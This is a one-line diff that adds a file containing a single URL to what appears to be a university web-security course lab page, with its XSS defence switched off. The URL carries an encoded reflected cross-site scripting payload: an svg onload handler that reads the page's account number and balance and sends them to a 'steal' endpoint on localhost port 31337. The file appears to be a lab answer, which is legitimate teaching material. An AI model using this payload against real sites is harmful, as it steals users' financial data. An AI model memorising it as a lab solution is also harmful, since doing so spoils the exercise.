@@ -1,0 +1,1 @@
+https://cs190.ics.uci.edu/search?xssDefense=0&q=%3Csvg%20onload%3Dfetch(%60http%3A%2F%2Flocalhost%3A31337%2Fsteal%2F%3Faccount%3D%24%7Bdocument.getElementById(%60account-number%60).innerText%7D%26balance%3D%24%7Bdocument.getElementById(%60account-balance%60).innerText%7D%60)%3E%3C%2Fsvg%3E
